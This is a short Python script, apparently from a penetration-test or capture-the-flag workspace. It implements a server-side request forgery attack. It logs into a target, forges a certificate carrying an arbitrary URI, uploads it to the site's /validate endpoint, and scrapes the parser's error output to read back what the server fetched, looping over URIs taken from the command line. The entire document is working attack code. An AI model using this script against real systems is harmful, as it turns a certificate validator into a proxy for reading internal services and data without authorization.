import sys,re,requests
sys.path.insert(0,'/work')
import probe

def ssrf(uri, cn="Test Contractor"):
    s=probe.login()
    cert=probe.make_cert(uri,cn)
    r=s.post(probe.base+"/validate",files={"certificate":("cert.pem",cert,"application/x-pem-file")},timeout=60)
    t=r.text
    m=re.search(r'<pre class="parser-error">(.*?)</pre>',t,re.S)
    if m:
        import html
        return html.unescape(m.group(1))
    m=re.search(r'<div class="error-msg">(.*?)</div>',t,re.S)
    if m: return "ERROR: "+m.group(1)
    return "NO_OUTPUT"

if __name__=="__main__":
    for uri in sys.argv[1:]:
        print("====",uri)
        print(ssrf(uri))

